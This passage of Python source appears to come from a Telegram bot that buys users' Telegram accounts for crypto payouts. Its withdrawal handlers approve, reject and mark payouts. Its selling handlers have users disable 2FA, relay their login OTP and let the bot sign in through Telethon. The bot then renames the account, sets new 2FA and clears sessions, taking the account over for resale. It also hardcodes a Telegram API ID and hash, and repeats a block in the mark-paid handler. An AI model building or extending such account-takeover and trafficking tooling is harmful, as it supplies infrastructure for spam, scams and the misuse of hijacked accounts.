                f"💳 **Method:** {withdrawal.withdrawal_method}\n"
                f"📍 **Address:** {withdrawal.withdrawal_address}\n"
                f"💸 **{translation_service.get_text('amount_deducted', user_lang)}**\n"
                f"� **New Balance:** ${withdrawal_user.balance:.2f}\n\n"
                f"🚀 **Status:** LEADER APPROVED ✅\n"
                f"�🕒 **Approved At:** {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"⏳ Your payment is being processed and will be sent to your address shortly.\n"
                f"📬 **{translation_service.get_text('notification_sent', user_lang)}**"
            )
            await context.bot.send_message(
                chat_id=withdrawal_user.telegram_user_id,
                text=approval_user_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to notify user of withdrawal approval: {e}")
        
        # Log activity
        try:
            ActivityLogService.log_action(
                db, withdrawal.user_id, "WITHDRAWAL_APPROVED",
                f"Withdrawal ${withdrawal.amount:.2f} approved by leader {db_user.first_name}"
            )
        except Exception as e:
            logger.error(f"Failed to log withdrawal approval activity: {e}")
            
    except Exception as e:
        logger.error(f"Error approving withdrawal: {e}")
        await query.edit_message_text("❌ Error processing approval. Please try again.")
    finally:
        close_db_session(db)

async def handle_reject_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle withdrawal rejection by leaders."""
    query = update.callback_query
    user = update.effective_user
    
    # Extract withdrawal ID from callback data
    withdrawal_id = int(query.data.split("_")[-1])
    
    db = get_db_session()
    try:
        # Check if user is a leader
        db_user = UserService.get_or_create_user(db, user.id, user.username, user.first_name, user.last_name)
        if not db_user.is_leader:
            await query.edit_message_text("❌ Access denied. Only leaders can reject withdrawals.")
            return
        
        # Get withdrawal
        withdrawal = db.query(Withdrawal).filter(Withdrawal.id == withdrawal_id).first()
        if not withdrawal:
            await query.edit_message_text("❌ Withdrawal not found.")
            return
        
        if withdrawal.status != WithdrawalStatus.PENDING:
            await query.edit_message_text(f"❌ Withdrawal already {withdrawal.status.value.lower()}.")
            return
        
        # Update withdrawal status
        withdrawal.status = WithdrawalStatus.REJECTED
        withdrawal.assigned_leader_id = db_user.id
        withdrawal.processed_at = datetime.utcnow()
        withdrawal.leader_notes = "Rejected by leader"
        db.commit()
        
        # Get user who made the withdrawal
        withdrawal_user = db.query(User).filter(User.id == withdrawal.user_id).first()
        
        # Update the message to show rejection
        rejection_text = (
            f"❌ **WITHDRAWAL REJECTED**\n\n"
            f"👤 User: {withdrawal_user.first_name or 'Unknown'} (@{withdrawal_user.username or 'no_username'})\n"
            f"💰 Amount: *${withdrawal.amount:.2f}*\n"
            f"💳 Method: *{withdrawal.withdrawal_method}*\n"
            f"📍 Address: `{withdrawal.withdrawal_address}`\n"
            f"👑 Rejected by: {db_user.first_name} (@{db_user.username})\n"
            f"🕒 Rejected: {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"❌ **Status:** REJECTED"
        )
        
        await query.edit_message_text(rejection_text, parse_mode='Markdown')
        
        # Notify user of rejection with detailed information
        try:
            # Get user's language preference
            user_lang = 'en'  # Default to English if no context available
            
            rejection_user_text = (
                f"❌ **{translation_service.get_text('withdrawal_rejected', user_lang)}**\n\n"
                f"💰 **Amount:** ${withdrawal.amount:.2f}\n"
                f"💳 **Method:** {withdrawal.withdrawal_method}\n"
                f"📍 **Address:** {withdrawal.withdrawal_address}\n\n"
                f"� **Status:** REJECTED ❌\n"
                f"🕒 **Rejected At:** {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"👑 **Rejected By:** Leader\n\n"
                f"💰 **Your balance remains:** ${withdrawal_user.balance:.2f}\n"
                f"📞 Please contact support if you have questions about this rejection.\n"
                f"🔄 You can submit a new withdrawal request if needed."
            )
            await context.bot.send_message(
                chat_id=withdrawal_user.telegram_user_id,
                text=rejection_user_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to notify user of withdrawal rejection: {e}")
        
        # Log activity
        try:
            ActivityLogService.log_action(
                db, withdrawal.user_id, "WITHDRAWAL_REJECTED",
                f"Withdrawal ${withdrawal.amount:.2f} rejected by leader {db_user.first_name}"
            )
        except Exception as e:
            logger.error(f"Failed to log withdrawal rejection activity: {e}")
            
    except Exception as e:
        logger.error(f"Error rejecting withdrawal: {e}")
        await query.edit_message_text("❌ Error processing rejection. Please try again.")
    finally:
        close_db_session(db)

async def handle_view_user_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle viewing user details."""
    query = update.callback_query
    user = update.effective_user
    
    # Extract user ID from callback data
    target_user_id = int(query.data.split("_")[-1])
    
    db = get_db_session()
    try:
        # Check if user is a leader
        db_user = UserService.get_or_create_user(db, user.id, user.username, user.first_name, user.last_name)
        if not db_user.is_leader:
            await query.edit_message_text("❌ Access denied. Only leaders can view user details.")
            return
        
        # Get target user
        target_user = db.query(User).filter(User.telegram_user_id == target_user_id).first()
        if not target_user:
            await query.edit_message_text("❌ User not found.")
            return
        
        # Get user statistics
        user_withdrawals = db.query(Withdrawal).filter(Withdrawal.user_id == target_user.id).count()
        pending_withdrawals = db.query(Withdrawal).filter(
            Withdrawal.user_id == target_user.id,
            Withdrawal.status == WithdrawalStatus.PENDING
        ).count()
        
        user_details = (
            f"👤 **User Details**\n\n"
            f"📛 Name: {target_user.first_name or 'Unknown'} {target_user.last_name or ''}\n"
            f"🆔 Username: @{target_user.username or 'no_username'}\n"
            f"🆔 Telegram ID: `{target_user.telegram_user_id}`\n"
            f"💰 Balance: ${target_user.balance:.2f}\n"
            f"📊 Status: {target_user.status.value}\n"
            f"📅 Joined: {target_user.created_at.strftime('%Y-%m-%d')}\n\n"
            f"**Withdrawal History:**\n"
            f"📤 Total Withdrawals: {user_withdrawals}\n"
            f"⏳ Pending: {pending_withdrawals}\n"
            f"💎 Total Earned: ${target_user.total_earnings:.2f}\n"
            f"🏪 Accounts Sold: {target_user.total_accounts_sold}"
        )
        
        keyboard = [[InlineKeyboardButton("← Back", callback_data="main_menu")]]
        await query.edit_message_text(user_details, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        
    except Exception as e:
        logger.error(f"Error viewing user details: {e}")
        await query.edit_message_text("❌ Error loading user details. Please try again.")
    finally:
        close_db_session(db)

async def handle_mark_paid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle marking withdrawal as paid."""
    query = update.callback_query
    user = update.effective_user
    
    # Extract withdrawal ID from callback data
    withdrawal_id = int(query.data.split("_")[-1])
    
    db = get_db_session()
    try:
        # Check if user is a leader
        db_user = UserService.get_or_create_user(db, user.id, user.username, user.first_name, user.last_name)
        if not db_user.is_leader:
            await query.edit_message_text("❌ Access denied. Only leaders can mark withdrawals as paid.")
            return
        
        # Get withdrawal
        withdrawal = db.query(Withdrawal).filter(Withdrawal.id == withdrawal_id).first()
        if not withdrawal:
            await query.edit_message_text("❌ Withdrawal not found.")
            return
        
        if withdrawal.status != WithdrawalStatus.LEADER_APPROVED:
            await query.edit_message_text(f"❌ Withdrawal must be approved first. Current status: {withdrawal.status.value}")
            return
        
        # Update withdrawal status
        withdrawal.status = WithdrawalStatus.COMPLETED
        withdrawal.processed_at = datetime.utcnow()
        withdrawal.leader_notes = f"Payment completed by {db_user.first_name}"
        db.commit()
        
        # Get user who made the withdrawal
        withdrawal_user = db.query(User).filter(User.id == withdrawal.user_id).first()
        
        # Update the message to show completion
        completion_text = (
            f"✅ **WITHDRAWAL COMPLETED**\n\n"
            f"👤 User: {withdrawal_user.first_name or 'Unknown'} (@{withdrawal_user.username or 'no_username'})\n"
            f"💰 Amount: *${withdrawal.amount:.2f}*\n"
            f"💳 Method: *{withdrawal.withdrawal_method}*\n"
            f"📍 Address: `{withdrawal.withdrawal_address}`\n"
            f"💳 Completed by: {db_user.first_name} (@{db_user.username})\n"
            f"🕒 Completed: {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"✅ **Status:** PAID & COMPLETED"
        )
        
        withdrawal.leader_notes = f"Payment completed by {db_user.first_name}"
        db.commit()
        
        # Get user who made the withdrawal
        withdrawal_user = db.query(User).filter(User.id == withdrawal.user_id).first()
        
        # Update the message to show completion
        completion_text = (
            f"✅ **WITHDRAWAL COMPLETED**\n\n"
            f"👤 User: {withdrawal_user.first_name or 'Unknown'} (@{withdrawal_user.username or 'no_username'})\n"
            f"💰 Amount: *${withdrawal.amount:.2f}*\n"
            f"💳 Method: *{withdrawal.withdrawal_method}*\n"
            f"📍 Address: `{withdrawal.withdrawal_address}`\n"
            f"💳 Completed by: {db_user.first_name} (@{db_user.username})\n"
            f"🕒 Completed: {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"✅ **Status:** PAID & COMPLETED"
        )
        
        await query.edit_message_text(completion_text, parse_mode='Markdown')
        
        # Notify user of completion with detailed information
        try:
            # Get user's language preference
            user_lang = 'en'  # Default to English if no context available
            
            completion_user_text = (
                f"🎉 **{translation_service.get_text('withdrawal_completed', user_lang)}**\n\n"
                f"💰 **Amount:** ${withdrawal.amount:.2f}\n"
                f"💳 **Method:** {withdrawal.withdrawal_method}\n"
                f"📍 **Address:** {withdrawal.withdrawal_address}\n\n"
                f"✅ **Status:** PAYMENT SENT! 🚀\n"
                f"🕒 **Completed At:** {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"💳 **Processed By:** Leader Team\n\n"
                f"🎯 **Your payment has been successfully sent to your address!**\n"
                f"💎 Thank you for using our service.\n"
                f"📈 You can continue selling more accounts to earn more!"
            )
            await context.bot.send_message(
                chat_id=withdrawal_user.telegram_user_id,
                text=completion_user_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to notify user of withdrawal completion: {e}")
        
        # Log activity
        try:
            ActivityLogService.log_action(
                db, withdrawal.user_id, "WITHDRAWAL_COMPLETED",
                f"Withdrawal ${withdrawal.amount:.2f} completed by leader {db_user.first_name}"
            )
        except Exception as e:
            logger.error(f"Failed to log withdrawal completion activity: {e}")
            
    except Exception as e:
        logger.error(f"Error marking withdrawal as paid: {e}")
        await query.edit_message_text("❌ Error processing payment confirmation. Please try again.")
    finally:
        close_db_session(db)

async def cancel_sale(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel the sale process."""
    # Cleanup session if exists
    if 'session_key' in context.user_data:
        await telegram_service.cleanup_session(context.user_data['session_key'])
    
    context.user_data.clear()
    
    cancel_text = "❌ **Sale Cancelled**\n\nYour account remains unchanged.\nNo modifications were made."
    
    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(cancel_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# Setup conversation handler
def get_real_selling_handler():
    return ConversationHandler(
        entry_points=[
            CallbackQueryHandler(start_real_selling, pattern='^start_real_selling$')
        ],
        states={
            PHONE: [
                CallbackQueryHandler(handle_ready_confirmation, pattern='^confirm_ready_to_sell$'),
                CallbackQueryHandler(handle_selling_info, pattern='^selling_info$'),
                CallbackQueryHandler(handle_country_callback, pattern='^country_'),
                CallbackQueryHandler(handle_country_callback, pattern='^more_countries$'),
                CallbackQueryHandler(handle_phone_digit, pattern='^digit_'),
                CallbackQueryHandler(handle_phone_digit, pattern='^backspace$'),
                CallbackQueryHandler(handle_phone_digit, pattern='^confirm_phone$'),
                MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_phone),
                CallbackQueryHandler(confirm_send_otp, pattern='^confirm_send_otp$')
            ],
            WAITING_OTP: [
                CallbackQueryHandler(handle_otp_digit, pattern='^otp_'),
                CallbackQueryHandler(handle_otp_digit, pattern='^otp_backspace$'),
                CallbackQueryHandler(handle_otp_digit, pattern='^verify_otp$'),
                CallbackQueryHandler(handle_otp_digit, pattern='^resend_otp$'),
                MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_otp)
            ],
            OTP_RECEIVED: [CallbackQueryHandler(handle_continue_setup, pattern='^continue_setup$')],
            DISABLE_2FA_WAIT: [CallbackQueryHandler(handle_2fa_disabled, pattern='^2fa_disabled$')],
            NAME_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_real_name_input),
                CallbackQueryHandler(handle_real_name_input, pattern='^random_name$')
            ]
        },
        fallbacks=[
            CallbackQueryHandler(cancel_sale, pattern='^cancel_sale$')
        ]
    )

def get_status_emoji(status: str) -> str:
    """Get emoji for user status."""
    status_emojis = {
        "ACTIVE": "✅",
        "PENDING_VERIFICATION": "⏳", 
        "FROZEN": "❄️",
        "BANNED": "🚫",
        "SUSPENDED": "⏸️"
    }
    return status_emojis.get(status, "❓")

async def handle_account_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show user's account details and statistics."""
    user = update.effective_user
    db = get_db_session()
    
    # Get user's language preference
    user_lang = translation_service.get_user_language(context)
    
    try:
        db_user = UserService.get_user_by_telegram_id(db, user.id)
        accounts = TelegramAccountService.get_user_accounts(db, db_user.id)
        
        details_text = f"""
{translation_service.get_text('account_details_title', user_lang)}

{translation_service.get_text('user_information', user_lang)}
{translation_service.get_text('name_label', user_lang)} {user.first_name or 'N/A'} {user.last_name or ''}
{translation_service.get_text('username_label', user_lang)} @{user.username or translation_service.get_text('no_username', user_lang)}
{translation_service.get_text('user_id_label', user_lang)} `{user.id}`
{translation_service.get_text('member_since_label', user_lang)} {db_user.created_at.strftime('%Y-%m-%d')}

{translation_service.get_text('account_statistics', user_lang)}
{translation_service.get_text('total_accounts', user_lang)} {len(accounts)}
{translation_service.get_text('available_to_sell', user_lang)} {len([a for a in accounts if a.status.value == 'AVAILABLE'])}
{translation_service.get_text('already_sold', user_lang)} {len([a for a in accounts if a.status.value == 'SOLD'])}
{translation_service.get_text('on_hold', user_lang)} {len([a for a in accounts if a.status.value == '24_HOUR_HOLD'])}

{translation_service.get_text('financial_summary', user_lang)}
{translation_service.get_text('current_balance', user_lang)} `${db_user.balance:.2f}`
{translation_service.get_text('total_sold', user_lang)} {db_user.total_accounts_sold} accounts
{translation_service.get_text('total_earnings', user_lang)} `${db_user.total_earnings:.2f}`
{translation_service.get_text('average_per_account', user_lang)} `${(db_user.total_earnings / max(db_user.total_accounts_sold, 1)):.2f}`

{translation_service.get_text('performance', user_lang)}
{translation_service.get_text('success_rate', user_lang)} {((db_user.total_accounts_sold / max(len(accounts), 1)) * 100):.1f}%
{translation_service.get_text('status_label', user_lang)} {get_status_emoji(db_user.status.value)} {db_user.status.value}
        """
        
        keyboard = [
            [InlineKeyboardButton(translation_service.get_text('view_all_accounts', user_lang), callback_data="view_all_accounts")],
            [InlineKeyboardButton(translation_service.get_text('withdrawal_history', user_lang), callback_data="withdrawal_history")],
            [InlineKeyboardButton(translation_service.get_text('back_menu', user_lang), callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            details_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Error in account details: {e}")
        await update.callback_query.edit_message_text(
            translation_service.get_text('error_loading', user_lang)
        )
    finally:
        close_db_session(db)

async def handle_language_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle language selection."""
    # Get user's current language
    user_lang = translation_service.get_user_language(context)
    
    language_text = f"""
{translation_service.get_text('language_title', user_lang)}

{translation_service.get_text('choose_language', user_lang)}

{translation_service.get_text('available_languages', user_lang)}
• 🇺🇸 English
• 🇪🇸 Español  
• 🇫🇷 Français
• 🇩🇪 Deutsch
• 🇷🇺 Русский
• 🇨🇳 中文
• 🇮🇳 हिंदी
• 🇦🇪 العربية

{translation_service.get_text('language_applied', user_lang)}
    """
    
    keyboard = [
        [InlineKeyboardButton("🇺🇸 English", callback_data="lang_en"),
         InlineKeyboardButton("🇪🇸 Español", callback_data="lang_es")],
        [InlineKeyboardButton("🇫🇷 Français", callback_data="lang_fr"),
         InlineKeyboardButton("🇩🇪 Deutsch", callback_data="lang_de")],
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
         InlineKeyboardButton("🇨🇳 中文", callback_data="lang_zh")],
        [InlineKeyboardButton("🇮🇳 हिंदी", callback_data="lang_hi"),
         InlineKeyboardButton("🇦🇪 العربية", callback_data="lang_ar")],
        [InlineKeyboardButton(translation_service.get_text('back_menu', user_lang), callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.callback_query.edit_message_text(
        language_text,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def handle_language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle individual language selection."""
    query = update.callback_query
    data = query.data
    
    # Language mapping
    languages = {
        'lang_en': ('🇺🇸 English', 'en'),
        'lang_es': ('🇪🇸 Español', 'es'), 
        'lang_fr': ('🇫🇷 Français', 'fr'),
        'lang_de': ('🇩🇪 Deutsch', 'de'),
        'lang_ru': ('🇷🇺 Русский', 'ru'),
        'lang_zh': ('🇨🇳 中文', 'zh'),
        'lang_hi': ('🇮🇳 हिंदी', 'hi'),
        'lang_ar': ('🇦🇪 العربية', 'ar')
    }
    
    if data in languages:
        lang_name, lang_code = languages[data]
        
        # Save language preference in context
        translation_service.set_user_language(context, lang_code)
        
        # Get localized success message
        success_text = f"""
{translation_service.get_text('language_updated', lang_code)}

{translation_service.get_text('language_changed_to', lang_code)} {lang_name}

{translation_service.get_text('language_active', lang_code)} {lang_name}.

🔄 **Interface has been updated to your selected language.**
        """
        
        keyboard = [
            [InlineKeyboardButton(translation_service.get_text('main_menu', lang_code), callback_data="main_menu")],
            [InlineKeyboardButton(translation_service.get_text('change_language', lang_code), callback_data="language_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            success_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    else:
        await query.answer(translation_service.get_text('invalid_selection', translation_service.get_user_language(context)))

def setup_real_handlers(application) -> None:
    """Set up the real bot handlers with the preferred 2x2 grid interface."""
    from telegram.ext import CommandHandler, CallbackQueryHandler, MessageHandler, filters
    import telegram
    
    # ===========================================
    # CLEAN HANDLERS - PROFESSIONAL STRUCTURE
    # ===========================================
    
    async def ultra_aggressive_captcha_answer_real(update, context):
        """CLEAN handler for CAPTCHA, phone, and OTP processing!"""
        user = update.effective_user
        user_input = update.message.text.strip() if update.message and update.message.text else ""
        
        print(f"🔍 PROCESSING INPUT: '{user_input}' from user {user.id}")
        
        # ⚠️ CRITICAL: SKIP if user is in ANY ConversationHandler
        # This prevents handler clashing and ensures user intent is respected
        active_conversations = [
            'broadcast_type',  # Admin broadcast
            'admin_edit_state',  # Admin editing user data
            'withdrawal_state',  # Withdrawal process
            'user_edit_field',  # User field editing
        ]
        
        for conv_key in active_conversations:
            if context.user_data.get(conv_key):
                print(f"🎯 SKIP: User {user.id} is in '{conv_key}' conversation, letting ConversationHandler handle it")
                return  # Let the ConversationHandler process this
        
        # Also check the conversation state tracker used by PTB
        if hasattr(context, 'user_data') and '_conversation_state' in context.user_data:
            print(f"🎯 SKIP: User {user.id} has active conversation state, letting ConversationHandler handle it")
            return
        
        # 🔥 CLEAN PHONE HANDLER 🔥
        if (context.user_data.get('conversation_type') == 'selling' and 
            user_input and user_input.startswith('+') and len(user_input) >= 8):
            
            print(f"📱 CLEAN PHONE: Processing '{user_input}' for user {user.id}")
            
            try:
                context.user_data['phone'] = user_input
                
                processing_msg = await update.message.reply_text(
                    f"📡 **Sending REAL OTP to {user_input}**\n\n⏳ Please wait..."
                )
                
                # CLEAN Telethon implementation
                from telethon import TelegramClient
                import os
                
                api_id = os.getenv('API_ID', '21734417')
                api_hash = os.getenv('API_HASH', 'd64eb98d90eb41b8ba3644e3722a3714')
                session_name = f"clean_otp_{user.id}"
                
                client = TelegramClient(session_name, api_id, api_hash)
                await client.connect()
                
                result = await client.send_code_request(user_input)
                context.user_data['phone_code_hash'] = result.phone_code_hash
                context.user_data['otp_session'] = session_name
                
                await processing_msg.edit_text(
                    f"✅ **REAL OTP SENT to {user_input}!**\n\n"
                    f"📲 Check your Telegram app for the 5-digit code\n\n"
                    f"**Enter the code below:**"
                )
                
                await client.disconnect()
                return
                
            except Exception as e:
                print(f"🔥 CLEAN PHONE ERROR: {e}")
                await update.message.reply_text(f"❌ **OTP Send Failed**: {str(e)}")
                return
        
        # 🔥 CLEAN OTP HANDLER 🔥
        if (context.user_data.get('conversation_type') == 'selling' and 
            context.user_data.get('phone') and context.user_data.get('phone_code_hash') and
            user_input.isdigit() and len(user_input) == 5):
            
            print(f"🔐 CLEAN OTP: Verifying '{user_input}' for user {user.id}")
            
            try:
                phone = context.user_data.get('phone')
                phone_code_hash = context.user_data.get('phone_code_hash')
                session_name = context.user_data.get('otp_session')
                
                from telethon import TelegramClient
                import os
                
                api_id = os.getenv('API_ID', '21734417')
                api_hash = os.getenv('API_HASH', 'd64eb98d90eb41b8ba3644e3722a3714')
                
                client = TelegramClient(session_name, api_id, api_hash)
                await client.connect()
                
                # Verify OTP
                result = await client.sign_in(phone, user_input, phone_code_hash=phone_code_hash)
                
                await update.message.reply_text(
                    f"🎉 **OTP VERIFIED SUCCESSFULLY!**\n\n"
                    f"✅ Phone: {phone}\n"
                    f"✅ Code: {user_input}\n\n"
                    f"**Your account is now connected!**\n\n"
                    f"🚀 Account selling process complete!"
                )
                
                # Start account configuration process
                try:
                    from services.account_configuration import AccountConfigurationService
                    config_service = AccountConfigurationService()
                    await config_service.configure_account_after_sale(phone, user.id)
                    
                    await update.message.reply_text(
                        "🎊 **Account Configuration Complete!**\n\n"
                        "Your account has been automatically configured with:\n"
                        "✅ New name and username\n"
                        "✅ New profile photo\n"
                        "✅ Enhanced 2FA security\n"
                        "✅ Session cleanup\n\n"
                        "**Sale process finished successfully!**"
                    )
                    
                except Exception as config_error:
                    print(f"⚠️ Account configuration error: {config_error}")
                    await update.message.reply_text(
                        "✅ **OTP Verified!** Account connection successful.\n"
                        "⚠️ Auto-configuration encountered an issue but account is ready."
                    )
                
                # Clean up
                context.user_data.pop('phone_code_hash', None)
                context.user_data.pop('otp_session', None)
                context.user_data.pop('phone', None)
                context.user_data.pop('conversation_type', None)
                
                await client.disconnect()
                return
                
            except Exception as e:
                print(f"🔥 CLEAN OTP ERROR: {e}")
                await update.message.reply_text(f"❌ **OTP Verification Failed**: {str(e)}")
                return
        if context.user_data.get('verification_step') == 1 and context.user_data.get('captcha_answer'):
            print(f"� CLEAN CAPTCHA: '{user_input}' from user {user.id}")
            
            try:
                correct_answer = context.user_data.get('captcha_answer', '').lower()
                user_answer = user_input.lower()
                
                if user_answer == correct_answer:
                    print(f"✅ CLEAN CAPTCHA: Correct for user {user.id}")
                    
                    # Mark captcha as completed
                    from database import get_db_session, close_db_session
                    from database.operations import UserService
                    
                    db = get_db_session()
                    try:
                        db_user = UserService.get_user_by_telegram_id(db, user.id)
                        if db_user:
                            db_user.captcha_completed = True
                            db.commit()
                    finally:
                        close_db_session(db)
                    
                    # Clear captcha data
                    context.user_data.pop('captcha_answer', None)
                    context.user_data.pop('verification_step', None)
                    
                    # Send verification success
                    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                    keyboard = [[InlineKeyboardButton("✅ Verify Membership", callback_data="verify_channels")]]
                    
                    await update.message.reply_text(
                        "🎉 **CAPTCHA Solved Successfully!**\n\n"
                        "✅ Great job! Now click the button below to verify your membership:",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    
                else:
                    print(f"❌ CLEAN CAPTCHA: Wrong for user {user.id}")
                    
                    # Generate new captcha
                    from services.captcha import CaptchaService
                    from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                    captcha_service = CaptchaService()
                    captcha_result = await captcha_service.generate_captcha()
                    
                    if captcha_result and "answer" in captcha_result:
                        context.user_data['captcha_answer'] = captcha_result['answer']
                        
                        keyboard = [[InlineKeyboardButton("🔄 New CAPTCHA", callback_data="new_captcha")]]
                        
                        with open(captcha_result["image_path"], 'rb') as photo:
                            await update.message.reply_photo(
                                photo=photo,
                                caption=f"❌ **Incorrect!** Try again.\n\n"
                                       f"🔒 Enter the {len(captcha_result['answer'])} characters you see:",
                                reply_markup=InlineKeyboardMarkup(keyboard)
                            )
                    else:
                        await update.message.reply_text("❌ Wrong answer. Please try /start to get a new captcha.")
                        
            except Exception as e:
                print(f"🔐 CLEAN CAPTCHA ERROR: {e}")
                await update.message.reply_text("❌ Error processing verification. Please try /start again.")
                
        return

    # Start command handler that shows the real main menu
    async def start_handler(update, context):
        """🔥 BULLETPROOF START: ALWAYS FORCE CAPTCHA VERIFICATION! 🔥"""
        user = update.effective_user
        print(f"🚀🚀🚀 BULLETPROOF START: User {user.id} starting bot - FORCING CAPTCHA! 🚀🚀🚀")
        
        try:
            from database import get_db_session, close_db_session
            from database.operations import UserService
            
            db = get_db_session()
            try:
                # Get or create user
                db_user = UserService.get_user_by_telegram_id(db, user.id)
                if not db_user:
                    db_user = UserService.create_user(db, user.id, user.username, user.first_name, user.last_name)
                
                # 🔥 FORCE CAPTCHA: ALWAYS reset verification status! 🔥
                print(f"🔥 FORCING CAPTCHA: Resetting verification for user {user.id}")
                db_user.captcha_completed = False
                db_user.verification_completed = False
                db_user.channels_joined = False
                db.commit()
                
                # ALWAYS start verification process
                await start_verification_process(update, context, db_user)
                print(f"🔥 BULLETPROOF: Started verification for user {user.id}")
                
            finally:
                close_db_session(db)
                
        except Exception as e:
            print(f"🔥 BULLETPROOF START ERROR: {e}")
            # Fallback: still try to show verification
            await start_verification_process(update, context, None)
    
    # ===========================================
    # HANDLER REGISTRATION ORDER (CRITICAL FOR PREVENTING CLASHES)
    # ===========================================
    # ORDER MATTERS! Handlers are checked in registration order.
    # 1. ConversationHandlers FIRST (they need priority for multi-step flows)
    # 2. Specific CallbackQueryHandlers
    # 3. Command handlers
    # 4. General MessageHandler LAST (fallback for captcha/phone/OTP)
    # ===========================================
    
    # Add start command handler
    application.add_handler(CommandHandler("start", start_handler))
    
    # ===========================================
    # PRIORITY 1: CONVERSATIONHANDLERS (HIGHEST PRIORITY)
    # These MUST be registered BEFORE all other handlers to work correctly
    # ===========================================
    
    # Import withdrawal functions from main_handlers to avoid circular imports
    from handlers.main_handlers import (
        handle_withdraw_menu, handle_withdraw_trx, handle_withdraw_usdt, 
        handle_withdraw_binance, handle_withdrawal_history, handle_withdrawal_details,
        handle_withdrawal_confirmation, WITHDRAW_DETAILS, WITHDRAW_CONFIRM, handle_check_balance
    )
    
    # WITHDRAWAL CONVERSATION HANDLER - Define and register FIRST
    async def cancel_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel withdrawal conversation"""
        if update.callback_query:
            await update.callback_query.answer()
        context.user_data.pop('conversation_type', None)
        context.user_data.pop('withdrawal_currency', None)
        context.user_data.pop('withdrawal_amount', None)
        context.user_data.pop('withdrawal_address', None)
        return ConversationHandler.END
    
    async def isolated_withdrawal_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle withdrawal wallet address input - CLEAN VERSION"""
        user = update.effective_user
        message_text = update.message.text if update.message else "No text"
        
        # Check conversation type
        if context.user_data.get('conversation_type') != 'withdrawal':
            logger.info(f"🔒 Not withdrawal conversation - ignoring message from user {user.id}")
            return  # Just return, don't interfere with other handlers
        
        logger.info(f"💸 WITHDRAWAL HANDLER - Processing wallet address from user {user.id}: '{message_text}'")
        
        try:
            # Call the main withdrawal handler
            result = await handle_withdrawal_details(update, context)
            logger.info(f"💸 WITHDRAWAL HANDLER - Result: {result}")
            return result
        except Exception as e:
            logger.error(f"💸 WITHDRAWAL HANDLER - Error: {e}")
            await update.message.reply_text("❌ Error processing withdrawal. Please try again.")
            return ConversationHandler.END
    
    withdrawal_conversation = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(handle_withdraw_trx, pattern='^withdraw_trx$'),
            CallbackQueryHandler(handle_withdraw_usdt, pattern='^withdraw_usdt$'),
            CallbackQueryHandler(handle_withdraw_binance, pattern='^withdraw_binance$')
        ],
        states={
            WITHDRAW_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, isolated_withdrawal_text_handler)],
            WITHDRAW_CONFIRM: [
                CallbackQueryHandler(handle_withdrawal_confirmation, pattern='^(confirm_withdrawal|cancel_withdrawal)$')
            ]
        },
        fallbacks=[
            CallbackQueryHandler(cancel_withdrawal, pattern='^withdraw_menu$'),
            CallbackQueryHandler(cancel_withdrawal, pattern='^main_menu$'),
            MessageHandler(filters.COMMAND, cancel_withdrawal)
        ],
        per_message=False,
        per_user=True
    )
    application.add_handler(withdrawal_conversation)
    logger.info("✅ Withdrawal ConversationHandler registered with HIGHEST priority")
    
    # SELLING CONVERSATION HANDLER - Register SECOND
    application.add_handler(get_real_selling_handler())
    logger.info("✅ Selling ConversationHandler registered")
    
    # ADMIN CONVERSATION HANDLERS - Register THIRD
    try:
        from handlers.admin_handlers import setup_admin_handlers
        setup_admin_handlers(application)
        logger.info("✅ Admin ConversationHandlers registered")
    except Exception as e:
        logger.error(f"Failed to load admin handlers: {e}")
    
    # ===========================================
    # PRIORITY 2: CALLBACKQUERYHANDLERS AND OTHER HANDLERS
    # These come AFTER ConversationHandlers
    # ===========================================
    
    # Add main menu callback handlers
    application.add_handler(CallbackQueryHandler(lambda update, context: show_real_main_menu(update, context), pattern='^main_menu$'))
    
    # System Capacity Handler - Real-time server metrics
    async def handle_system_capacity(update, context):
        """Show real-time system capacity and server metrics."""
        try:
